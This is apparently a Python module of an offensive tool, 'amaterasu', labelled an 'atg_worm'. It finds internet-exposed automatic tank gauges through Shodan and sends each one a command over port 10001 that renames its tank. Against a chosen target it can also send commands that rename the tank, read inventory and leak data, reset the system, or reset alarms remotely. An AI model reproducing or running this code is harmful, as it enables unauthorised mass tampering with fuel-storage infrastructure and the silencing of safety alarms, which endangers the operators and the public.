#!/usr/bin/env python3.7
#coding: utf-8
#Project amaterasu

import argparse
import cmd2
import requests
from lib.db.sqlconnection import *
from prettytable import from_db_cursor
from pwn import *

set_parser = argparse.ArgumentParser()
set_subparsers = set_parser.add_subparsers(title='subcommands', help='subcommand help')

parser_target = set_subparsers.add_parser('target', help='target help')
parser_target.add_argument('target', type=str)

parser_tank_name = set_subparsers.add_parser('tank_name', help='tank_name help')
parser_tank_name.add_argument('tank_name', type=str)

parser_inventory = set_subparsers.add_parser('inventory', help='inventory help')
parser_inventory.add_argument('inventory', type=bool)

parser_leak = set_subparsers.add_parser('leak', help='leak help')
parser_leak.add_argument('leak', type=bool)

parser_reset = set_subparsers.add_parser('reset', help='reset help')
parser_reset.add_argument('reset', type=bool)

parser_sensor_alarm_history = set_subparsers.add_parser('sensor_alarm_history', help='sensor_alarm_history help')
parser_sensor_alarm_history.add_argument('sensor_alarm_history', type=bool)
parser_alarm_reset = set_subparsers.add_parser('alarm_reset', help='alarm_reset help')
parser_alarm_reset.add_argument('alarm_reset', type=bool)

parser_useShodan = set_subparsers.add_parser('shodan', help='shodan help')
parser_useShodan.add_argument('shodan', type=bool)

show_parser = argparse.ArgumentParser()
show_parser.add_argument('show', choices=["config"])

class ATGworm(cmd2.Cmd):
	prompt = 'amaterasu[exploitation/atg_worm]> '

	def __init__(self):
		shodan_test = SQLiteConnection().select_fetchall(SQLiteConnection().create_connection('lib/db/amaterasu.db'), 'SELECT key FROM apis WHERE name == "shodan"')
		super().__init__()
		self.target = ''
		self.tank_name = ''
		self.ips = []
		self.shodan = False
		self.inventory = False
		self.leak = False
		self.reset = False
		self.sensor_alarm_history = False
		self.alarm_reset = False
		if shodan_test == None:
			self.shodanAPIkey = ''
		else:
			self.shodanAPIkey = shodan_test

	def show(self, args):
		'''Shows something'''
		if args.show == 'config':
			print(f'Target: {self.target}\nTank name: {self.tank_name}\nInventory report set: {self.inventory}\nLeak report set: {self.leak}\nSensor alarm history set: {self.sensor_alarm_history}\nRemote alarm reset set: {self.alarm_reset}\n')

	def set_target(self, args):
		self.target = args.target
		print(info(f'Target set: {self.target}'))

	def set_useShodan(self, args):
		self.shodan = args.shodan
		print(info(f'Use Shodan set: {self.shodan}'))

	def set_tank_name(self, args):
		self.tank_name = args.tank_name
		print(info(f'Tank name set: {self.tank_name}'))

	def set_reset(self, args):
		self.reset = args.reset
		print(info(f'Reset set: {self.reset}'))

	def set_inventory(self, args):
		self.inventory = args.inventory
		print(info(f'Inventory report set: {self.inventory}'))

	def set_leak(self, args):
		self.leak = args.leak
		print(info(f'Leak report set: {self.leak}'))

	def set_sensor_alarm_history(self, args):
		self.sensor_alarm_history = args.sensor_alarm_history
		print(info(f'Sensor alarm history set: {self.sensor_alarm_history}'))

	def set_alarm_reset(self, args):
		self.alarm_reset = args.alarm_reset
		print(info(f'Remote alarm reset set: {self.alarm_reset}'))

	parser_target.set_defaults(func = set_target)
	parser_tank_name.set_defaults(func = set_tank_name)
	parser_leak.set_defaults(func = set_leak)
	parser_inventory.set_defaults(func = set_inventory)
	parser_reset.set_defaults(func = set_reset)
	parser_sensor_alarm_history.set_defaults(func = set_sensor_alarm_history)
	parser_alarm_reset.set_defaults(func = set_alarm_reset)
	parser_useShodan.set_defaults(func = set_useShodan)
	show_parser.set_defaults(func = show)

	@cmd2.with_argparser(set_parser)
	def do_set(self, args):
		'''Used to set options.'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('set')

	@cmd2.with_argparser(show_parser)
	def do_show(self, args):
		''' Show [config, target etc.].'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('show')

	def do_back(self, args):
		'''Goes back to Amaterasu.'''
		return True

	def do_run(self, args):
		''' Runs the module.'''
		if self.shodan:
			requestShodan = requests.get(f'https://api.shodan.io/shodan/host/search?key={self.shodanAPIkey}&query=I20100')
			for match in requestShodan.json()["matches"]:
				self.ips.append(match["ip_str"])

			if self.ips != None:
				for ip in self.ips:
					try:
						remoteShodan = remote(ip, 10001)
						remoteShodan.send('\x01S60200 amaterasu\r\n')
						#remoteShodan.send('\x01I20100\r\n')
						remoteShodan.recvuntil(' ', drop = True)
						response = remoteShodan.recv(4029).decode('utf-8')

						print(f'Response: {response}')
						remoteShodan.close()
					except Exception as e:
						print(f'Error: {e}')
						pass

		if self.target != None:
			try:
				remoteTarget = remote(self.target, 10001)
				if self.tank_name != None:
					remoteTarget.send(f'\x01S60200 {self.tank_name}\r\n')

				if self.inventory is True:
					remoteTarget.send('\x01I20100\r\n')

				if self.leak is True:
					remoteTarget.send('\x01I20300\r\n')

				if self.reset is True:
					remoteTarget.send('\x01S00100\r\n')

				if self.sensor_alarm_history is True:
					remoteTarget.send('\x01I30200\r\n')

				if self.alarm_reset is True:
					remoteTarget.send('\x01IS00300\r\n')

				#remoteTarget.sendline('\x01I90200\r') # get version
				remoteTarget.recvuntil(' ', drop = True)
				response = remoteTarget.recv(2049).decode('utf-8')

				print(f'Response: {response}')
				remoteTarget.close()
			except Exception as e:
				print(f'Error: {e}')
